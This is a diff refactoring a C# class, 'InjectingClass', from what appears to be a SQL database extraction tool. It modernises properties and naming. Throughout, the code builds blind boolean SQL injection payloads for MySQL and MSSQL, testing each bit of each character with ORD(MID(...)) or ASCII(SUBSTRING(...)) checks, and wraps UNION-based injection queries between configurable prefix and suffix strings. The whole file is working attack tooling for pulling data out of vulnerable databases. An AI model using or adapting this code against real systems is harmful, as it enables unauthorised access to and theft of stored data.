@@ -1,112 +1,91 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Text;
 
-namespace Sql_Database_Extraction
+namespace ToolSet.DatabaseExtractorCode.DBExtractor
 {
-    public class InjectingClass
-    {
-        private string injectBegin;
-        public string InjectBegin
-        {
-            get { return injectBegin; }
-            set { injectBegin = value; }
-        }
+   public class InjectingClass
+   {
+      public string InjectBegin { get; set; }
 
-        private string injectEnd;
-        public string InjectEnd
-        {
-            get { return injectEnd; }
-            set { injectEnd = value; }
-        }
+      public string InjectEnd { get; set; }
 
-        private string injectcondition;
-        public string InjectCondition
-        {
-            get { return injectcondition; }
-            set { injectcondition = value; }
-        }
+      public string InjectCondition { get; set; }
 
-        #region Union Query Based
+      public string UnionQueryBegin { get; set; }
 
-        private string unionQueryBegin;
-        public string UnionQueryBegin
-        {
-            get { return unionQueryBegin; }
-            set { unionQueryBegin = value; }
-        }
+      public string UnionQueryEnd { get; set; }
 
-        private string unionQueryEnd;
-        public string UnionQueryEnd
-        {
-            get { return unionQueryEnd; }
-            set { unionQueryEnd = value; }
-        }
+      public InjectingClass()
+      {
+         InjectBegin = string.Empty;
+         InjectEnd = string.Empty;
+         InjectCondition = string.Empty;
 
-        #endregion
+         UnionQueryBegin = string.Empty;
+         UnionQueryEnd = string.Empty;
+      }
 
-        public InjectingClass()
-        {
-            injectBegin = string.Empty;
-            injectEnd = string.Empty;
-            injectcondition = string.Empty;
 
-            unionQueryBegin = string.Empty;
-            unionQueryEnd = string.Empty;
-        }
+      public List<string> InjectConditionQueries(string data, int charIndex, int asciIposition, int asciImax,
+                                                 DataBaseType dbType)
+      {
+         switch (dbType)
+         {
+            case DataBaseType.Mssql:
+               return ConditionQueriesMssql(data, charIndex, asciIposition, asciImax);
+            case DataBaseType.MySql:
+               return ConditionQueriesMySql(data, charIndex, asciIposition, asciImax);
+            default:
+               return null;
+         }
+      }
 
-        public List<string> InjectConditionQueries(string Data, int CharIndex, int ASCIIposition, int ASCIImax, eDataBase DBType)
-        {
-            if (DBType == eDataBase.MSSQL)
-                return ConditionQueriesMSSQL(Data, CharIndex, ASCIIposition, ASCIImax);
-            else if (DBType == eDataBase.MySQL)
-                return ConditionQueriesMySQL(Data, CharIndex, ASCIIposition, ASCIImax);
-            else
-                return null;
-        }
+      private List<string> ConditionQueriesMySql(string data, int charIndex, int asciIposition, int asciiMax)
+      {
+         var queries = new List<string>();
+         for (int w = 1; (asciIposition + w) <= asciiMax; w = w * 2)
+         {
+            queries.Add(
+               InjectString(
+                  " ORD(MID((" + data + ")," + charIndex + ",1))&" + Convert.ToString(asciIposition + w) + ">0", true));
+         }
+         return queries;
+      }
 
-        private List<string> ConditionQueriesMySQL(string Data, int CharIndex, int ASCIIposition, int ASCIImax)
-        {
-            List<string> Queries = new List<string>();
-            for (int w = 1; (ASCIIposition + w) <= ASCIImax; w = w * 2)
-            {
-                Queries.Add(InjectString(" ORD(MID((" + Data + ")," + CharIndex + ",1))&" + Convert.ToString(ASCIIposition + w) + ">0", true));
-            }
-            return Queries;
-        }
+      private List<string> ConditionQueriesMssql(string data, int charIndex, int asciiPosition, int asciiMax)
+      {
+         var queries = new List<string>();
+         for (int w = 1; (asciiPosition + w) <= asciiMax; w = w * 2)
+         {
+            queries.Add(
+               InjectString(
+                  " ASCII(SUBSTRING((" + data + ")," + charIndex + ",1))&" + Convert.ToString(asciiPosition + w) + ">0",
+                  true));
+         }
+         return queries;
+      }
 
-        private List<string> ConditionQueriesMSSQL(string Data, int CharIndex, int ASCIIposition, int ASCIImax)
-        {
-            List<string> Queries = new List<string>();
-            for (int w = 1; (ASCIIposition + w) <= ASCIImax; w = w * 2)
-            {
-                Queries.Add(InjectString(" ASCII(SUBSTRING((" + Data + ")," + CharIndex + ",1))&" + Convert.ToString(ASCIIposition + w) + ">0", true));
-            }
-            return Queries;
-        }
+      public List<string> InjectUnionQueries(List<string> unionQueries)
+      {
+         var newUnionQueries = new List<string>();
 
-        public List<string> InjectUnionQueries(List<string> UnionQueries)
-        {
-            List<string> NewUnionQueries = new List<string>();
-            foreach (string query in UnionQueries)
-            {
-                string text = InjectString(unionQueryBegin + query + unionQueryEnd, false);
-                NewUnionQueries.Add(text);
-            }
-            return NewUnionQueries;
-        }
+         foreach (string query in unionQueries)
+            newUnionQueries.Add(InjectString(UnionQueryBegin + query + UnionQueryEnd, false));
 
-        public string InjectUnionQuery(string Data)
-        {
-            return InjectString(unionQueryBegin + Data + unionQueryEnd, false);
-        }
+         return newUnionQueries;
+      }
 
-        private string InjectString(string Query, bool useCondition)
-        {
-            if (useCondition)
-                return injectBegin + injectcondition + Query + injectEnd;
-            else
-                return injectBegin + Query + injectEnd;
-        }
-    }
+      public string InjectUnionQuery(string data)
+      {
+         return InjectString(UnionQueryBegin + data + UnionQueryEnd, false);
+      }
+
+      private string InjectString(string query, bool useCondition)
+      {
+         if (useCondition)
+            return InjectBegin + InjectCondition + query + InjectEnd;
+
+         return InjectBegin + query + InjectEnd;
+      }
+   }
 }
